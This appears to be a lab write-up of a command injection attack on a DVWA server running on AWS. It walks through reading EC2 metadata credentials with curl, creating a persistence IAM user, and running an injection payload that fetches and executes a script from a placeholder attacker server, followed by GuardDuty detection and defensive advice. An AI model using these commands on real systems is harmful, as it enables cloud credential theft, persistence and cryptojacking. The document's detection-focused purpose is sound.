TARGET:DVWA

Vulnerability:Command Injection

Command Injection Exploit on DVWA Server

Overview

This document describes an attack scenario exploiting a Command Injection vulnerability on a DVWA (Damn Vulnerable Web Application) server. The server is assumed to run with root privileges, providing the attacker with unrestricted control upon successful exploitation.

Attack Scenario

Step 1: Vulnerability Discovery

	1.	The attacker identifies a Command Injection vulnerability in the web application by analyzing input parameters that are not properly sanitized.
	2.	Using crafted payloads, the attacker executes system-level commands.

Step 2: Information Gathering

	1.	AWS EC2 Instance Information:
	•	The attacker enumerates details about the environment (e.g., EC2 metadata, instance role credentials) using commands such as:

curl http://169.254.169.254/latest/meta-data/


	•	Extracts sensitive EC2 details, including security credentials and instance role.

	2.	System Reconnaissance:
	•	The attacker collects OS information, open ports, installed packages, and other system configurations.

Step 3: Malicious Payload Deployment

The attacker deploys a setup script to achieve multiple objectives:
	1.	IAM User Creation:
	•	Creates a new IAM user with escalated permissions for persistence and future access.

aws iam create-user --user-name malicious_user


	2.	Malware Installation:
	•	Downloads and installs malicious scripts and packages using commands such as:

wget http://<attacker-server>/setup.sh -O /tmp/setup.sh && bash /tmp/setup.sh


	3.	Botnet Integration and Data Harvesting:
	•	Uploads and executes scripts:
	•	C&C Communication (cnc.py): Establishes a connection to the attacker’s command-and-control server.
	•	Web Log Harvester (web_user_log.py): Collects sensitive user data from server logs.
	•	Network Sniffer (pcap.py): Captures and analyzes live network traffic for credentials.
	4.	Cryptocurrency Mining:
	•	Installs and configures a lightweight Bitcoin mining package (e.g., xmrig) to utilize server resources for mining operations.

Step 4: GuardDuty Detection

The malicious activities trigger AWS GuardDuty within minutes due to:
	1.	Suspicious Command Execution:
	•	Commands such as wget and cryptocurrency-related binaries (e.g., bitcoin) are flagged.
	2.	Runtime Behavior Analysis:
	•	High CPU utilization and outbound connections to known malicious IP addresses.

Timeline

	1.	Initial Exploitation and Payload Deployment: Within 2 minutes.
	2.	GuardDuty Detection: Within 4 minutes.

Example Payload

Below is an example of a Command Injection payload used to initiate the attack:

; wget http://<attacker-server>/setup.sh -O /tmp/setup.sh && bash /tmp/setup.sh;

Defensive Recommendations

	1.	Input Sanitization:
	•	Implement strict input validation to prevent command injection.
	2.	AWS Security Measures:
	•	Use fine-grained IAM permissions and monitor API activity.
	3.	GuardDuty Alerts:
	•	Regularly review and act on GuardDuty findings to mitigate malicious activity.

Conclusion

This scenario demonstrates how a poorly secured web application with a Command Injection and root vulnerability can be exploited to compromise an entire server, establish persistence, and perform malicious activities like cryptocurrency mining and data harvesting. Early detection and mitigation are critical in such cases.
